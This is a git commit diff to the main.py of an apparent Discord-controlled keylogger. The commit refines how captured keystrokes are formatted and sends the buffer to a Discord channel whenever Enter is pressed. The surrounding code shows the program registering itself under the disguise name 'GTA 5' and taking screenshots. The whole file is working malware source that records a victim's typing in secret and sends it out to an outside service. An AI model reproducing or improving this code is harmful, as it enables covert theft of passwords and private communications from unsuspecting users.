987f87021e3557a8b6dab6599a81e0aef929e951
Mateusz Gołembowski <44233157+mategol@users.noreply.github.com>
2022-11-21 00:56:33 +0100

    Added special keys formatting in logger output

--- main.py
+++ main.py
@@ -10,8 +10,8 @@ import pyautogui
 from resources.misc import *
 
 client = discord.Client(intents=discord.Intents.all())
-ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\x09': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
-text_buffor = ''
+ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
+text_buffor, force_to_send = '', False
 
 bot_token = ''   # Paste here BOT-token
 software_registry_name = 'GTA 5'   # ---------------------------------------------- Software name shown in registry
@@ -35,13 +35,13 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
 
 @client.event
 async def on_ready():
-    global text_buffor
+    global text_buffor, force_to_send
     await client.get_channel(channel_ids['main']).send('[' + current_time() + '] New PC session')
     while True:
-        await asyncio.sleep(1)
-        if len(text_buffor) > 1500:
-            await client.get_channel(channel_ids['main']).send(text_buffor)
-            text_buffor = ''
+        await asyncio.sleep(0.1)
+        if len(text_buffor) > 1500 or force_to_send:
+            await client.get_channel(channel_ids['main']).send(text_buffor.strip())
+            text_buffor, force_to_send = '', False
 
 @client.event
 async def on_message(message):
@@ -51,11 +51,21 @@ async def on_message(message):
         os.system('del ss.png')
 
 def on_press(key):
-    global text_buffor
+    global text_buffor, force_to_send
     processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
     if processed_key in ctrl_codes.keys():
         processed_key = ctrl_codes[processed_key]
-    text_buffor += str(processed_key)
+    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
+        match processed_key:
+            case Key.space:
+                processed_key = ' '
+            case Key.shift:
+                processed_key = ' *`SHIFT`*'
+            case Key.enter:
+                processed_key = ' *`ENTER`*'
+                force_to_send = True
+
+        text_buffor += str(processed_key)
 
 with Listener(on_press=on_press) as listener:
     client.run(bot_token)
